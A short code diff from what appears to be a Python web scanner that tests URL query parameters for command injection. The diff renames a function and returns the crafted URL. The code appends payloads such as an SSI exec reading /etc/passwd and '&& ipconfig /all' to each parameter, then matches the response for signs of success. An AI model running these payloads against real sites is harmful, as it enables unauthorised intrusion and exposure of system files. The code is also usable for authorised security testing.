@@ -18,11 +18,11 @@ payloads=["&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
           "&& ipconfig /all","ipconfig /all"
 ]
 check_have=[r".*root.*",r".*inet addr.*",r".*Windows.*"]
-def Get_com(url):
+def GetComIn(url):
     domain = url.split("?")[0]
     queries = urlparse.urlparse(url).query.split("&")
     if not any(queries):
-        return False, None
+        return False, None,None
     else:
         for payload in payloads:
             website = domain + "?" + ("&".join([param + payload for param in queries]))
@@ -31,7 +31,7 @@ def Get_com(url):
                 pattern = re.compile(test, re.I)
                 if pattern.findall(source):
                     # print("(+)this url have command injection bug {},payload is {}".format(url, payload))
-                    return True, payload
+                    return True, website,payload
     # print("(-)this url haven't command injection bug {}".format(url))
-    return False, None
+    return False, None,None
 
